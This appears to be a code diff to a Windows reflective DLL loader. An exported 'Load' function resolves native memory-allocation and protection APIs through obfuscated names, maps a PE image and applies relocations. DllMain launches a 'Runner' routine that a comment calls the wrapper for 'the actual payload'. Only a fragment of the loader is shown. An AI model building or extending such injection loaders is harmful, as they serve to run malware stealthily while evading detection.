@@ -20,9 +20,10 @@ BOOL APIENTRY DllMain(HMODULE hModule,
     case DLL_PROCESS_ATTACH:
 
         hAppInstance = hModule;
-
+        
+        // Wrapper function for the actual payload
         Runner();
-        //ExitProcess(0);
+
         break;
 
     case DLL_THREAD_ATTACH:
@@ -60,29 +61,27 @@ extern "C" __declspec(dllexport) ULONG_PTR Load(LPVOID lpParameter) {
     WINAPIS WinAPIs = { 0 };
     PEHDRS PEHdrs = { 0 };
 
-    WinAPIs.fnAlloc = (Alloc_t)GetAddr(hNTModule, NTVA);
-    WinAPIs.fnLoad = (Load_t)GetAddr(hModule, LLB);
-    WinAPIs.fnProt = (Protect_t)GetAddr(hNTModule, NTVP);
-    WinAPIs.Getter = (Getter_t)GetAddr(hModule, GP);
-    WinAPIs.Flusher = (Flush_t)GetAddr(hNTModule, FLS);
+    WinAPIs.fnAlloc = (Alloc_t)GetAddr(hNTModule, NTVA, &WinAPIs);
+    WinAPIs.fnLoad = (Load_t)GetAddr(hNTModule, LLB, &WinAPIs);
+    WinAPIs.fnProt = (Protect_t)GetAddr(hNTModule, NTVP, &WinAPIs);
+    WinAPIs.Flusher = (Flush_t)GetAddr(hNTModule, FLS, &WinAPIs);
 
 
-    if (WinAPIs.fnAlloc == NULL || WinAPIs.fnLoad == NULL || WinAPIs.fnProt == NULL || WinAPIs.Getter == NULL) {
+    if (WinAPIs.fnAlloc == NULL || WinAPIs.fnLoad == NULL || WinAPIs.fnProt == NULL) {
         return NULL;
     }
+
 
     // Parse the PE headers and store them for later usage
     if (!ParsePEHeaders(&PEHdrs, (LPVOID)dllBaseAddress)) {
         return NULL;
     }
 
-
     // Allocate memory and copy all sections and headers
     LPVOID pPEBase = PreparePEMemory(&PEHdrs, &WinAPIs);
     if (pPEBase == NULL) {
         return NULL;
     }
-
 
     // Apply relocations
     ApplyRelocations(&PEHdrs, pPEBase);
